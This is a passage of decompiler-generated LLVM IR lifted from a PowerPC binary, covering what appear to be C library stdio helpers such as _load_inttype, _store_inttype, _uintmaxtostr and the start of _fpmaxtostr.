  %v1_100103b0 = load i32, i32* @r4, align 4
  %v2_100103b0 = and i32 %v1_100103b0, %v3_100103ac
  store i32 %v2_100103b0, i32* %r9.global-to-local, align 4
  %v5_100103b0 = icmp eq i32 %v2_100103b0, 0
  br i1 %v5_100103b0, label %dec_label_pc_100103b8, label %dec_label_pc_100103c8

dec_label_pc_100103b8:                            ; preds = %entry
  %v1_100103b8 = and i32 %v3_100103ac, 2176
  store i32 %v1_100103b8, i32* %r9.global-to-local, align 4
  %v3_100103b8 = icmp eq i32 %v1_100103b8, 0
  br i1 %v3_100103b8, label %dec_label_pc_100103c0, label %dec_label_pc_100103d4

dec_label_pc_100103c0:                            ; preds = %dec_label_pc_100103b8
  %v2_100103c0 = or i32 %v1_100103b0, %v3_100103ac
  store i32 %v2_100103c0, i32* %r0.global-to-local, align 4
  %v1_100103c4 = trunc i32 %v2_100103c0 to i16
  store i16 %v1_100103c4, i16* %v1_100103ac, align 2
  %v0_100103c8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100103c8

dec_label_pc_100103c8:                            ; preds = %entry, %dec_label_pc_100103c0
  %v0_10010404 = phi i32 [ %v0_100103a4, %entry ], [ %v0_100103c8.pre, %dec_label_pc_100103c0 ]
  %v1_100103c8 = inttoptr i32 %v0_10010404 to i16*
  %v2_100103c8 = load i16, i16* %v1_100103c8, align 2
  %v3_100103c8 = zext i16 %v2_100103c8 to i32
  %v1_100103cc = and i32 %v3_100103c8, 32
  store i32 %v1_100103cc, i32* %r0.global-to-local, align 4
  %v3_100103cc = icmp eq i32 %v1_100103cc, 0
  br i1 %v3_100103cc, label %dec_label_pc_100103f4, label %dec_label_pc_100103d4

dec_label_pc_100103d4:                            ; preds = %dec_label_pc_100103b8, %dec_label_pc_100103c8
  %v0_100103d4 = call i32 @__errno_location()
  store i32 %v0_100103d4, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_100103dc = inttoptr i32 %v0_100103d4 to i32*
  store i32 9, i32* %v2_100103dc, align 4
  br label %dec_label_pc_100103e0

dec_label_pc_100103e0:                            ; preds = %dec_label_pc_1001041c, %dec_label_pc_100103d4
  %v0_100103e0 = load i32, i32* @r31, align 4
  %v1_100103e0 = inttoptr i32 %v0_100103e0 to i16*
  %v2_100103e0 = load i16, i16* %v1_100103e0, align 2
  %v3_100103e0 = zext i16 %v2_100103e0 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100103e8 = or i32 %v3_100103e0, 8
  store i32 %v1_100103e8, i32* %r0.global-to-local, align 4
  %v1_100103ec = trunc i32 %v1_100103e8 to i16
  store i16 %v1_100103ec, i16* %v1_100103e0, align 2
  br label %dec_label_pc_1001047c

dec_label_pc_100103f4:                            ; preds = %dec_label_pc_100103c8
  %tmp = urem i16 %v2_100103c8, 4
  %v1_100103f4 = zext i16 %tmp to i32
  store i32 %v1_100103f4, i32* %r0.global-to-local, align 4
  %v3_100103f4 = icmp eq i16 %tmp, 0
  br i1 %v3_100103f4, label %dec_label_pc_10010458, label %dec_label_pc_100103fc

dec_label_pc_100103fc:                            ; preds = %dec_label_pc_100103f4
  %v1_100103fc = and i32 %v3_100103c8, 4
  store i32 %v1_100103fc, i32* %r9.global-to-local, align 4
  %v3_100103fc = icmp eq i32 %v1_100103fc, 0
  br i1 %v3_100103fc, label %dec_label_pc_10010404, label %dec_label_pc_1001043c

dec_label_pc_10010404:                            ; preds = %dec_label_pc_100103fc
  %v1_10010404 = add i32 %v0_10010404, 20
  %v2_10010404 = inttoptr i32 %v1_10010404 to i32*
  %v3_10010404 = load i32, i32* %v2_10010404, align 4
  store i32 %v3_10010404, i32* %r0.global-to-local, align 4
  %v1_10010408 = add i32 %v0_10010404, 16
  %v2_10010408 = inttoptr i32 %v1_10010408 to i32*
  %v3_10010408 = load i32, i32* %v2_10010408, align 4
  store i32 %v3_10010408, i32* %r9.global-to-local, align 4
  %v4_1001040c = icmp eq i32 %v3_10010404, %v3_10010408
  br i1 %v4_1001040c, label %dec_label_pc_10010414, label %dec_label_pc_1001041c

dec_label_pc_10010414:                            ; preds = %dec_label_pc_10010404
  %v1_10010414 = and i32 %v3_100103c8, 2
  store i32 %v1_10010414, i32* %r0.global-to-local, align 4
  %v3_10010414 = icmp eq i32 %v1_10010414, 0
  br i1 %v3_10010414, label %dec_label_pc_1001043c, label %dec_label_pc_1001041c

dec_label_pc_1001041c:                            ; preds = %dec_label_pc_10010404, %dec_label_pc_10010414
  %v1_1001041c = and i32 %v3_100103c8, 1024
  store i32 %v1_1001041c, i32* %r9.global-to-local, align 4
  %v0_10010424 = call i32 @__asm_mfcr()
  store i32 %v0_10010424, i32* %r3.global-to-local, align 4
  %v1_10010428 = call i32 @__asm_rlwinm(i32 %v0_10010424, i32 3, i32 31, i32 31)
  %v1_1001042c = sub i32 2, %v1_10010428
  store i32 %v1_1001042c, i32* @r5, align 4
  store i32 268502068, i32* @lr, align 4
  %v1_10010430 = call i32 @__GI_fseek(i32 %v1_1001042c)
  store i32 %v1_10010430, i32* %r3.global-to-local, align 4
  %v3_10010434 = icmp eq i32 %v1_10010430, 0
  br i1 %v3_10010434, label %dec_label_pc_1001041c.dec_label_pc_1001043c_crit_edge, label %dec_label_pc_100103e0

dec_label_pc_1001041c.dec_label_pc_1001043c_crit_edge: ; preds = %dec_label_pc_1001041c
  %v0_1001043c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001043c

dec_label_pc_1001043c:                            ; preds = %dec_label_pc_1001041c.dec_label_pc_1001043c_crit_edge, %dec_label_pc_100103fc, %dec_label_pc_10010414
  %v0_1001043c = phi i32 [ %v0_1001043c.pre, %dec_label_pc_1001041c.dec_label_pc_1001043c_crit_edge ], [ %v0_10010404, %dec_label_pc_100103fc ], [ %v0_10010404, %dec_label_pc_10010414 ]
  %v1_1001043c = inttoptr i32 %v0_1001043c to i16*
  %v2_1001043c = load i16, i16* %v1_1001043c, align 2
  %v3_1001043c = zext i16 %v2_1001043c to i32
  store i32 %v3_1001043c, i32* %r0.global-to-local, align 4
  %v1_10010440 = add i32 %v0_1001043c, 8
  %v2_10010440 = inttoptr i32 %v1_10010440 to i32*
  %v3_10010440 = load i32, i32* %v2_10010440, align 4
  store i32 %v3_10010440, i32* %r9.global-to-local, align 4
  %v1_10010444 = call i32 @__asm_rlwinm(i32 %v3_1001043c, i32 0, i32 0, i32 29)
  %v2_10010444 = trunc i32 %v1_10010444 to i16
  store i32 %v1_10010444, i32* %r0.global-to-local, align 4
  %v3_10010448 = load i32, i32* @r31, align 4
  %v4_10010448 = inttoptr i32 %v3_10010448 to i16*
  store i16 %v2_10010444, i16* %v4_10010448, align 2
  %v0_1001044c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001044c = load i32, i32* @r31, align 4
  %v2_1001044c = add i32 %v1_1001044c, 20
  %v3_1001044c = inttoptr i32 %v2_1001044c to i32*
  store i32 %v0_1001044c, i32* %v3_1001044c, align 4
  %v0_10010450 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010450 = load i32, i32* @r31, align 4
  %v2_10010450 = add i32 %v1_10010450, 24
  %v3_10010450 = inttoptr i32 %v2_10010450 to i32*
  store i32 %v0_10010450, i32* %v3_10010450, align 4
  %v0_10010454 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010454 = load i32, i32* @r31, align 4
  %v2_10010454 = add i32 %v1_10010454, 16
  %v3_10010454 = inttoptr i32 %v2_10010454 to i32*
  store i32 %v0_10010454, i32* %v3_10010454, align 4
  %v0_10010458.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010458

dec_label_pc_10010458:                            ; preds = %dec_label_pc_100103f4, %dec_label_pc_1001043c
  %v2_10010464 = phi i32 [ %v0_10010404, %dec_label_pc_100103f4 ], [ %v0_10010458.pre, %dec_label_pc_1001043c ]
  %v1_10010458 = inttoptr i32 %v2_10010464 to i16*
  %v2_10010458 = load i16, i16* %v1_10010458, align 2
  %v3_10010458 = zext i16 %v2_10010458 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10010460 = or i32 %v3_10010458, 64
  store i32 %v1_10010460, i32* %r0.global-to-local, align 4
  %v1_10010464 = trunc i32 %v1_10010460 to i16
  store i16 %v1_10010464, i16* %v1_10010458, align 2
  %v0_10010468 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010468 = urem i32 %v0_10010468, 65536
  store i32 %v1_10010468, i32* %r0.global-to-local, align 4
  %v1_1001046c = and i32 %v0_10010468, 2816
  store i32 %v1_1001046c, i32* %r9.global-to-local, align 4
  %v3_1001046c = icmp eq i32 %v1_1001046c, 0
  br i1 %v3_1001046c, label %dec_label_pc_10010474, label %dec_label_pc_1001047c

dec_label_pc_10010474:                            ; preds = %dec_label_pc_10010458
  %v0_10010474 = load i32, i32* @r31, align 4
  %v1_10010474 = add i32 %v0_10010474, 12
  %v2_10010474 = inttoptr i32 %v1_10010474 to i32*
  %v3_10010474 = load i32, i32* %v2_10010474, align 4
  store i32 %v3_10010474, i32* %r0.global-to-local, align 4
  %v2_10010478 = add i32 %v0_10010474, 28
  %v3_10010478 = inttoptr i32 %v2_10010478 to i32*
  store i32 %v3_10010474, i32* %v3_10010478, align 4
  br label %dec_label_pc_1001047c

dec_label_pc_1001047c:                            ; preds = %dec_label_pc_10010458, %dec_label_pc_100103e0, %dec_label_pc_10010474
  store i32 %v0_10010398, i32* %r0.global-to-local, align 4
  store i32 %v0_100103a0, i32* @r31, align 4
  %v0_1001048c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001048c

; uselistorder directives
  uselistorder i32 %v0_10010468, { 1, 0 }
  uselistorder i32 %v1_10010444, { 1, 0 }
  uselistorder i32 %v0_1001043c, { 1, 0 }
  uselistorder i32 %v0_10010404, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_100103ac, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_1001047c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010458, { 1, 0 }
  uselistorder label %dec_label_pc_1001043c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001041c, { 1, 0 }
  uselistorder label %dec_label_pc_100103d4, { 1, 0 }
  uselistorder label %dec_label_pc_100103c8, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_10010490 = load i32, i32* @r5, align 4
  %v1_10010490 = icmp slt i32 %v0_10010490, 0
  %v1_10010494 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_100104d0 = icmp eq i32 %v1_10010494, 0
  br i1 %v1_10010490, label %dec_label_pc_100104d0, label %dec_label_pc_1001049c

dec_label_pc_1001049c:                            ; preds = %entry
  br i1 %v3_100104d0, label %dec_label_pc_100104a4, label %dec_label_pc_100104d8

dec_label_pc_100104a4:                            ; preds = %dec_label_pc_1001049c
  %v3_100104a4 = icmp eq i32 %arg1, 256
  br i1 %v3_100104a4, label %dec_label_pc_100104b0, label %dec_label_pc_100104b8

dec_label_pc_100104b0:                            ; preds = %dec_label_pc_100104a4
  br label %dec_label_pc_100104c4

dec_label_pc_100104b8:                            ; preds = %dec_label_pc_100104a4
  %v3_100104b8 = icmp eq i32 %arg1, 512
  br i1 %v3_100104b8, label %dec_label_pc_100104c0, label %dec_label_pc_100104c4

dec_label_pc_100104c0:                            ; preds = %dec_label_pc_100104b8
  br label %dec_label_pc_100104c4

dec_label_pc_100104c4:                            ; preds = %dec_label_pc_100104b8, %dec_label_pc_100104b0, %dec_label_pc_100104c0
  ret i32 0

dec_label_pc_100104d0:                            ; preds = %entry
  br i1 %v3_100104d0, label %dec_label_pc_100104e4, label %dec_label_pc_100104d8

dec_label_pc_100104d8:                            ; preds = %dec_label_pc_1001049c, %dec_label_pc_100104d0
  %v2_100104d8 = load i32, i32* %arg2, align 4
  ret i32 %v2_100104d8

dec_label_pc_100104e4:                            ; preds = %dec_label_pc_100104d0
  %v3_100104e4 = icmp eq i32 %arg1, 256
  %v2_100104e8 = load i32, i32* %arg2, align 4
  br i1 %v3_100104e4, label %dec_label_pc_100104f0, label %dec_label_pc_100104f8

dec_label_pc_100104f0:                            ; preds = %dec_label_pc_100104e4
  %v1_100104f0 = urem i32 %v2_100104e8, 256
  br label %dec_label_pc_10010504

dec_label_pc_100104f8:                            ; preds = %dec_label_pc_100104e4
  %v3_100104f8 = icmp eq i32 %arg1, 512
  br i1 %v3_100104f8, label %dec_label_pc_10010500, label %dec_label_pc_10010504

dec_label_pc_10010500:                            ; preds = %dec_label_pc_100104f8
  %v1_10010500 = mul i32 %v2_100104e8, 65536
  %v2_10010500 = sdiv i32 %v1_10010500, 65536
  br label %dec_label_pc_10010504

dec_label_pc_10010504:                            ; preds = %dec_label_pc_100104f8, %dec_label_pc_100104f0, %dec_label_pc_10010500
  %v0_10010504 = phi i32 [ %v2_100104e8, %dec_label_pc_100104f8 ], [ %v1_100104f0, %dec_label_pc_100104f0 ], [ %v2_10010500, %dec_label_pc_10010500 ]
  %tmp = icmp slt i32 %v0_10010504, 0
  %v1_10010508 = zext i1 %tmp to i32
  %v2_10010508 = ashr i32 %v0_10010504, 31
  %v3_10010508 = and i32 %v2_10010508, -2
  %v4_10010508 = or i32 %v3_10010508, %v1_10010508
  ret i32 %v4_10010508

; uselistorder directives
  uselistorder i32 %v0_10010504, { 1, 0 }
  uselistorder i32 %v2_100104e8, { 2, 0, 1 }
  uselistorder i1 %v3_100104d0, { 1, 0 }
  uselistorder label %dec_label_pc_10010504, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100104d8, { 1, 0 }
  uselistorder label %dec_label_pc_100104c4, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10010510 = load i32, i32* @r4, align 4
  %v3_10010510 = icmp eq i32 %v0_10010510, 256
  br i1 %v3_10010510, label %dec_label_pc_1001051c, label %dec_label_pc_10010524

dec_label_pc_1001051c:                            ; preds = %entry
  %v0_1001051c = load i32, i32* @r6, align 4
  %v1_1001051c = trunc i32 %v0_1001051c to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1001051c, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10010524:                            ; preds = %entry
  %v3_10010514 = icmp eq i32 %v0_10010510, 2048
  br i1 %v3_10010514, label %dec_label_pc_1001052c, label %dec_label_pc_10010538

dec_label_pc_1001052c:                            ; preds = %dec_label_pc_10010524
  %v0_1001052c = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1001052c, i32* %tmp2, align 4
  %v0_10010530 = load i32, i32* @r6, align 4
  %v3_10010530 = add i32 %tmp, 4
  %v4_10010530 = inttoptr i32 %v3_10010530 to i32*
  store i32 %v0_10010530, i32* %v4_10010530, align 4
  ret i32 %tmp

dec_label_pc_10010538:                            ; preds = %dec_label_pc_10010524
  %v3_10010524 = icmp eq i32 %v0_10010510, 512
  %v0_1001053c = load i32, i32* @r6, align 4
  br i1 %v3_10010524, label %dec_label_pc_1001053c, label %dec_label_pc_10010544

dec_label_pc_1001053c:                            ; preds = %dec_label_pc_10010538
  %v1_1001053c = trunc i32 %v0_1001053c to i16
  store i16 %v1_1001053c, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10010544:                            ; preds = %dec_label_pc_10010538
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1001053c, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 1, 0, 2, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1001054c = load i32, i32* %r7.global-to-local, align 4
  %v3_1001054c = icmp eq i32 %v0_1001054c, 0
  store i1 %v3_1001054c, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp12 = icmp sgt i32 %v0_1001054c, -1
  br i1 %tmp12, label %dec_label_pc_10010580, label %dec_label_pc_10010560

dec_label_pc_10010560:                            ; preds = %entry
  %v0_10010560 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010564 = sub i32 0, %v0_1001054c
  store i32 %v1_10010564, i32* %r7.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_10010560, -1
  br i1 %tmp13, label %dec_label_pc_10010580, label %dec_label_pc_1001056c

dec_label_pc_1001056c:                            ; preds = %dec_label_pc_10010560
  %v0_1001056c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001056c = sub i32 0, %v0_1001056c
  %v2_1001056c = sub i32 -1, %v0_1001056c
  store i32 %v1_1001056c, i32* %r6.global-to-local, align 4
  %v4_1001056c = icmp uge i32 %v2_1001056c, %v1_1001056c
  %v1_10010570 = sub i32 -1, %v0_10010560
  %v3_10010570 = zext i1 %v4_1001056c to i32
  %v4_10010570 = add i32 %v3_10010570, %v1_10010570
  store i32 %v4_10010570, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010580

dec_label_pc_10010580:                            ; preds = %entry, %dec_label_pc_10010560, %dec_label_pc_1001056c
  %v1_10010584 = phi i32 [ %v1_10010564, %dec_label_pc_1001056c ], [ %v1_10010564, %dec_label_pc_10010560 ], [ %v0_1001054c, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1001056c ], [ 0, %dec_label_pc_10010560 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10010584 = udiv i32 -1, %v1_10010584
  store i32 %v2_10010584, i32* @r8, align 4
  %v2_1001058c = load i32, i32* %r3.global-to-local, align 4
  %v3_1001058c = inttoptr i32 %v2_1001058c to i8*
  store i8 0, i8* %v3_1001058c, align 1
  %v0_10010590 = load i32, i32* @r8, align 4
  %v1_10010590 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010590 = mul i32 %v1_10010590, %v0_10010590
  %v1_10010594 = sub i32 0, %v2_10010590
  store i32 %v1_10010594, i32* %r31.global-to-local, align 4
  %v4_10010598 = icmp eq i32 %v1_10010590, %v1_10010594
  br i1 %v4_10010598, label %dec_label_pc_100105a0, label %dec_label_pc_100105a8

dec_label_pc_100105a0:                            ; preds = %dec_label_pc_10010580
  %v1_100105a0 = add i32 %v0_10010590, 1
  store i32 %v1_100105a0, i32* @r8, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100105a8

dec_label_pc_100105a8:                            ; preds = %dec_label_pc_10010580, %dec_label_pc_100105a0
  %v0_100105a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_100105a8, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_100105ac

dec_label_pc_100105acthread-pre-split:            ; preds = %dec_label_pc_10010600
  %v0_100105ac.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_100105b0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100105ac

dec_label_pc_100105ac:                            ; preds = %dec_label_pc_100105acthread-pre-split, %dec_label_pc_100105a8
  %v1_100105f4 = phi i32 [ %v1_100105b0.pre, %dec_label_pc_100105acthread-pre-split ], [ %v1_10010590, %dec_label_pc_100105a8 ]
  %v1_100105c4 = phi i32 [ %v0_100105ac.pr, %dec_label_pc_100105acthread-pre-split ], [ %v0_100105a8, %dec_label_pc_100105a8 ]
  %v3_100105ac = icmp eq i32 %v1_100105c4, 0
  %v0_100105b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100105b0 = udiv i32 %v0_100105b0, %v1_100105f4
  br i1 %v3_100105ac, label %dec_label_pc_100105f4, label %dec_label_pc_100105b8

dec_label_pc_100105b8:                            ; preds = %dec_label_pc_100105ac
  %v2_100105b8 = udiv i32 %v1_100105c4, %v1_100105f4
  %v2_100105bc = mul i32 %v2_100105b8, %v1_100105f4
  %v2_100105c0 = mul i32 %v2_100105b0, %v1_100105f4
  %v2_100105c4 = sub i32 %v1_100105c4, %v2_100105bc
  store i32 %v2_100105b8, i32* %r12.global-to-local, align 4
  %v0_100105cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100105cc = mul i32 %v0_100105cc, %v2_100105c4
  %v2_100105d0 = sub i32 %v0_100105b0, %v2_100105c0
  %v2_100105d4 = add i32 %v2_100105cc, %v2_100105d0
  %v0_100105d8 = load i32, i32* @r8, align 4
  %v2_100105d8 = mul i32 %v0_100105d8, %v2_100105c4
  %v2_100105dc = udiv i32 %v2_100105d4, %v1_100105f4
  %v2_100105e0 = add i32 %v2_100105d8, %v2_100105b0
  %v2_100105e4 = mul i32 %v2_100105dc, %v1_100105f4
  store i32 %v2_100105e4, i32* @r10, align 4
  %v2_100105e8 = add i32 %v2_100105e0, %v2_100105dc
  store i32 %v2_100105e8, i32* %r6.global-to-local, align 4
  %v2_100105ec = sub i32 %v2_100105d4, %v2_100105e4
  store i32 %v2_100105ec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010600

dec_label_pc_100105f4:                            ; preds = %dec_label_pc_100105ac
  %v2_100105f4 = mul i32 %v2_100105b0, %v1_100105f4
  %v2_100105f8 = sub i32 %v0_100105b0, %v2_100105f4
  store i32 %v2_100105f8, i32* %r5.global-to-local, align 4
  store i32 %v2_100105b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010600

dec_label_pc_10010600:                            ; preds = %dec_label_pc_100105b8, %dec_label_pc_100105f4
  %v1_10010604 = phi i32 [ %v2_100105b8, %dec_label_pc_100105b8 ], [ 0, %dec_label_pc_100105f4 ]
  %v0_10010604 = phi i32 [ %v2_100105e8, %dec_label_pc_100105b8 ], [ %v2_100105b0, %dec_label_pc_100105f4 ]
  %v0_10010608 = phi i32 [ %v2_100105ec, %dec_label_pc_100105b8 ], [ %v2_100105f8, %dec_label_pc_100105f4 ]
  %v2_10010604 = or i32 %v0_10010604, %v1_10010604
  %v5_10010604 = icmp eq i32 %v2_10010604, 0
  store i1 %v5_10010604, i1* %cr0_eq.global-to-local, align 1
  %v1_1001060c = load i32, i32* %r30.global-to-local, align 4
  %v0_10010610 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010610 = add i32 %v0_10010610, -1
  store i32 %v1_10010610, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_10010608, 10
  %v1_10010608.v2_1001060c.v = select i1 %tmp14, i32 48, i32 %v1_1001060c
  %v1_10010608.v2_1001060c = add i32 %v0_10010608, %v1_10010608.v2_1001060c.v
  %extract.t9.extract.t = trunc i32 %v1_10010608.v2_1001060c to i8
  %v3_10010620 = inttoptr i32 %v1_10010610 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_10010620, align 1
  %v0_10010624 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10010624, label %dec_label_pc_10010628, label %dec_label_pc_100105acthread-pre-split

dec_label_pc_10010628:                            ; preds = %dec_label_pc_10010600
  %v0_10010628 = load i32, i32* @r29, align 4
  %v3_10010628 = icmp eq i32 %v0_10010628, 0
  br i1 %v3_10010628, label %dec_label_pc_10010628.dec_label_pc_10010638_crit_edge, label %dec_label_pc_10010630

dec_label_pc_10010628.dec_label_pc_10010638_crit_edge: ; preds = %dec_label_pc_10010628
  %v0_10010640.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010638

dec_label_pc_10010630:                            ; preds = %dec_label_pc_10010628
  %v2_10010634 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010634 = add i32 %v2_10010634, -1
  %v4_10010634 = inttoptr i32 %v3_10010634 to i8*
  store i8 45, i8* %v4_10010634, align 1
  store i32 %v3_10010634, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010638

dec_label_pc_10010638:                            ; preds = %dec_label_pc_10010628.dec_label_pc_10010638_crit_edge, %dec_label_pc_10010630
  %v0_10010640 = phi i32 [ %v0_10010640.pre, %dec_label_pc_10010628.dec_label_pc_10010638_crit_edge ], [ %v3_10010634, %dec_label_pc_10010630 ]
  ret i32 %v0_10010640

; uselistorder directives
  uselistorder i32 %v2_100105b8, { 1, 2, 0 }
  uselistorder i32 %v2_100105b0, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_100105f4, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10010590, { 1, 2, 0 }
  uselistorder i32 %v0_10010590, { 1, 0 }
  uselistorder i32 %v0_1001054c, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010638, { 1, 0 }
  uselistorder label %dec_label_pc_10010600, { 1, 0 }
  uselistorder label %dec_label_pc_100105a8, { 1, 0 }
  uselistorder label %dec_label_pc_10010580, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10010644 = load i32, i32* @lr, align 4
  store i32 %v0_10010644, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10010660 = add i32 %tmp, 11
  %v2_10010660 = inttoptr i32 %v1_10010660 to i8*
  %v3_10010660 = load i8, i8* %v2_10010660, align 1
  %v4_10010660 = zext i8 %v3_10010660 to i32
  store i32 %v4_10010660, i32* %r31.global-to-local, align 4
  %v1_10010664 = or i32 %v4_10010660, 32
  %v1_10010668 = icmp ult i32 %v1_10010664, 97
  %v3_10010668 = icmp eq i32 %v1_10010664, 97
  store i1 %v1_10010668, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010668, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10010674 = add i32 %tmp, 4
  %v2_10010674 = inttoptr i32 %v1_10010674 to i32*
  %v3_10010674 = load i32, i32* %v2_10010674, align 4
  store i32 %v3_10010674, i32* %r28.global-to-local, align 4
  %v2_10010678 = load i32, i32* %arg2, align 4
  store i32 %v2_10010678, i32* %r30.global-to-local, align 4
  br i1 %v3_10010668, label %dec_label_pc_10010680, label %dec_label_pc_10010688

dec_label_pc_10010680:                            ; preds = %entry
  %v1_10010680 = add nuw nsw i32 %v4_10010660, 6
  store i32 %v1_10010680, i32* %r0.global-to-local, align 4
  %v1_10010684 = urem i32 %v1_10010680, 256
  store i32 %v1_10010684, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010688

dec_label_pc_10010688:                            ; preds = %entry, %dec_label_pc_10010680
  %v0_1001073c = phi i32 [ %v4_10010660, %entry ], [ %v1_10010684, %dec_label_pc_10010680 ]
  %v1_10010688 = icmp slt i32 %v2_10010678, 0
  %v3_10010688 = icmp eq i32 %v2_10010678, 0
  store i1 %v1_10010688, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010688, i1* %cr7_eq.global-to-local, align 1
